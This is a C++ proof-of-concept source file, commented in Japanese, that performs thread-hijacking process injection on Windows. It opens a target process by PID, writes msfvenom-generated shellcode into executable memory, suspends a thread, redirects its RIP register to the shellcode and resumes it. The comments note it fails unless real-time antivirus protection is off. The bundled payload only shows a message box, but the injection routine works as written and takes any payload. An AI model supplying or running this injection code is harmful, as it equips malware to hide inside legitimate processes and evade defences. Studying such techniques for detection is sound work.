/*
 * windowsのスレッドインジェクションのPOC
 * リアルタイム保護をOFFにしないと動かない
 */
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

/*
 * メッセージボックスを出すだけのシェルコード
 * msfvenom -p windows/x64/messagebox TEXT=world TITLE=hello -f c -v SHELLCODE
*/
unsigned char SHELLCODE[] =                                                                                                                                                                  
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"                                                                                                                                   
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"                                                                                                                                   
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"                                                                                                                                   
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"                                                                                                                                   
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"                                                                                                                                   
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"                                                                                                                                   
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"                                                                                                                                   
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"                                                                                                                                   
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"                                                                                                                                   
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"                                                                                                                                   
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"                                                                                                                                   
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"                                                                                                                                   
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"                                                                                                                                   
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"                                                                                                                                   
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"                                                                                                                                   
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"                                                                                                                                   
"\x8d\x8d\x1a\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"                                                                                                                                   
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"                                                                                                                                   
"\x00\x3e\x4c\x8d\x85\x14\x01\x00\x00\x48\x31\xc9\x41\xba"                                                                                                                                   
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"                                                                                                                                   
"\x56\xff\xd5\x77\x6f\x72\x6c\x64\x00\x68\x65\x6c\x6c\x6f"                                                                                                                                   
"\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

int main(int argc, char* argv[]) {
  if (argc != 2) {
    std::cout << "Usage: " << argv[0] << " <PID of the target process>" << std::endl;
    return 1;
  }

  /* 
   * STEP1)
   * PRTOCESS_ALL_ACCESS = 取得したプロセスハンドルに全アクセス権を要求
   */
  DWORD pid = DWORD(atoi(argv[1]));
  HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  if (!processHandle) {
    std::cout << "Failed to open the target process." << std::endl;
    return 1;
  } else {
    std::cout << "Opened target process successfully." << std::endl;
  }
  
  /* 
   * STEP2)
   * 取得したプロセスにシェルコードを入れるためのメモリ領域の確保
   * PAGE_EXECUTE_READWRITE = 確保したメモリ領域を実行・読み・書き込み可能に設定
   */
  LPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(SHELLCODE), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (!remoteBuffer) {
    std::cout << "Failed to allocate memory in the target process." << std::endl;
    CloseHandle(processHandle);
    return 1;
  } else {
    std::cout << "Allocated memory in target process successfully.\n";
 }
  
  /*
   * SETP3)
   * 取得したプロセスの確保したメモリ領域にシェルコード書き込み
   */
  if (!WriteProcessMemory(processHandle, remoteBuffer, SHELLCODE, sizeof(SHELLCODE), NULL)) {
    std::cout << "Failed to write to the target process memory." << std::endl;
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    return 1;
  } else {
    std::cout << "shellcode written to target process memory successfully.\n";
  }
  
  // TH32CS_SNAPTHREADフラグを使用して、システム内のすべてのプロセス内のスレッドのスナップショットを作成。
  // これにより、特定のプロセスに関連するスレッドを調べることができる。
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  if (snapshot == INVALID_HANDLE_VALUE) {
    std::cerr << "Failed to create snapshot of threads.\n";
    CloseHandle(processHandle);
    return 1;
  }

  // THREADENTRY32構造体を初期化する。
  THREADENTRY32 threadEntry{ sizeof(THREADENTRY32) };
  
  // Thread32First関数を使用して、スナップショット内の最初のスレッドの情報を取得
  // 成功すると、Thread32Next関数を使用して、後続のスレッドを繰り返し処理できる。
  if (!Thread32First(snapshot, &threadEntry)) {
    std::cerr << "Failed to get first thread.\n";
    CloseHandle(snapshot);
    CloseHandle(processHandle);
    return 1;
  } else {
    do {
      /*
       * STEP4)
       * PIDにより、ハイジャックするプロセスを特定
       * 各スレッドのオーナープロセスのIDと引数で受け取ったPIDを比較
       */
      if (threadEntry.th32OwnerProcessID == pid) {
        
        /*
         * STEP5)
         * プロセス内に新しくスレッドを作成
         */
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, FALSE, threadEntry.th32ThreadID);
        if (!hThread) {
          std::cerr << "Failed to open thread.\n";
          continue;
        }
        
        /*
         * STEP6)
         * 作成したスレッドを一時停止
         */
        if (SuspendThread(hThread) == (DWORD)-1) {
          std::cerr << "Failed to suspend thread.\n";
          CloseHandle(hThread);
          continue;
        } else {
          std::cout << "Thread suspended successfully.\n";
        }

        // 作成したスレッドのコンテキスト情報を核のするためのCONTEXT構造体を初期化
        // CONTEXT_FULLを使用して、すべてのレジスタ情報を取得 
        CONTEXT context{};
        context.ContextFlags = CONTEXT_FULL;

        /*
         * STEP7)
         * スレッドのコンテキストの取得
         */
        if (!GetThreadContext(hThread, &context)) {
          std::cerr << "Failed to get thread context.\n";
          // 失敗した場合も一時停止しているスレッドを再開してプログラムの整合性を保つ（クリーンアップ）
          ResumeThread(hThread);
        } else {
           /*
            * STEP8)
            * スレッドのRIPレジスタをメモリ内に注入したシェルコードのアドレスに書き換える
            */
           std::cout << "Got thread context successfully.\n";
           context.Rip = reinterpret_cast<DWORD_PTR>(remoteBuffer);

           /*
            * STEP9)
            * 変更されたコンテキスト（上記のRIP）をスレッドに反映
            */
           if (!SetThreadContext(hThread, &context)) {
             std::cerr << "Failed to set thread context.\n";
           } else {
             std::cout << "Thread context set successfully.\n";
           }

           /* 
            * STEP10)
            * 一時停止してあるスレッドを再開し、シェルコードを実行させる。
            */
           if (ResumeThread(hThread) == (DWORD)-1) {
             std::cerr << "Failed to resume thread.\n";
           } else {
             std::cout << "Thread resumed successfully.\n";
             break;
           } 
        }
        CloseHandle(hThread);
      }

    } while (Thread32Next(snapshot, &threadEntry));
  }

  CloseHandle(snapshot);
  CloseHandle(processHandle);
  
  return 0;
} 